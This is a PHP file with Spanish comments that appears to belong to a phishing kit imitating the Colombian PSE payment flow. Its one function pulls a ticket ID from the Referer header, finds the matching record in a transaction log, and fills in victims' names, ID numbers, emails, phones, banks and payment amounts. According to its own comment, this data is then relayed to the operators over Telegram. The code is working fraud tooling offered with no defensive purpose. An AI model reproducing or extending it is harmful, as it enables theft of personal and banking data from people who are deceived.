<?php
/**
 * tx_fallback.php — Enriquece los datos del cliente de la gate con el registro
 * de la transacción (transacciones_pse.json) usando el ticket ?t= de la URL
 * de referencia. Así el mensaje de Telegram SIEMPRE lleva nombre, documento,
 * correo, teléfono, banco y monto del formulario del paso 2, aunque el
 * localStorage del cliente venga vacío.
 */

function tx_cargar_datos_ticket(array $tbdatos): array {
    if (!empty($tbdatos['nombre'])) {
        return $tbdatos; // ya viene completo desde el navegador
    }
    if (empty($_SERVER['HTTP_REFERER'])) {
        return $tbdatos;
    }
    if (!preg_match('/[?&]t=([A-Za-z0-9\-]+)/', $_SERVER['HTTP_REFERER'], $mt)) {
        return $tbdatos;
    }

    $rootDir = __DIR__;
    for ($i = 0; $i < 8; $i++) {
        if (file_exists($rootDir . '/transacciones_pse.json')) break;
        $rootDir = dirname($rootDir);
    }
    $txFile = $rootDir . '/transacciones_pse.json';
    if (!file_exists($txFile)) {
        return $tbdatos;
    }

    $txLogs = json_decode((string)@file_get_contents($txFile), true) ?: [];
    foreach ($txLogs as $txL) {
        if (($txL['ticketId'] ?? '') === $mt[1]) {
            if (empty($tbdatos['nombre']))    $tbdatos['nombre']    = $txL['nombres'] ?? $txL['nombre'] ?? '';
            if (empty($tbdatos['documento'])) $tbdatos['documento'] = $txL['cedula'] ?? '';
            if (empty($tbdatos['correo']))    $tbdatos['correo']    = $txL['correo'] ?? $txL['email'] ?? '';
            if (empty($tbdatos['telefono']))  $tbdatos['telefono']  = $txL['celular'] ?? $txL['telefono'] ?? '';
            if (empty($tbdatos['banco']))     $tbdatos['banco']     = $txL['banco'] ?? '';
            if (empty($tbdatos['servicio']))  $tbdatos['servicio']  = $txL['servicio'] ?? '';
            if (empty($tbdatos['referencia'])) $tbdatos['referencia'] = $txL['referencia'] ?? '';
            if (empty($tbdatos['total_pagar']) && !empty($txL['monto'])) {
                $tbdatos['total_pagar'] = is_numeric($txL['monto']) ? $txL['monto'] : preg_replace('/[^0-9]/', '', (string)$txL['monto']);
            }
            break;
        }
    }
    return $tbdatos;
}
